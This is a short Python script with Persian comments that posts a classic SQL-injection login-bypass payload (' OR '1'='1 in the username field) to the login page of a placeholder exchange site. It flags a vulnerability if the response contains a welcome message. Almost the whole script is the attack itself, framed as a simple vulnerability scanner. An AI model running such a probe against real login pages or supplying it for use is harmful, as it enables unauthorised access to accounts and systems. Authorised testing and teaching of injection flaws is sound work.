import requests

# هدف فرضی
target_url = "http://example-exchange.com/login"

# تست ساده برای SQL Injection
print(f"Scanning {target_url} for vulnerabilities...")
payload = {"username": "' OR '1'='1", "password": "test"}
try:
    response = requests.post(target_url, data=payload, timeout=5)
    if "Welcome" in response.text or "Login successful" in response.text:
        print("Vulnerability found: Possible SQL Injection!")
    else:
        print("No obvious vulnerabilities detected.")
except Exception as e:
    print(f"Error during scan: {e}")
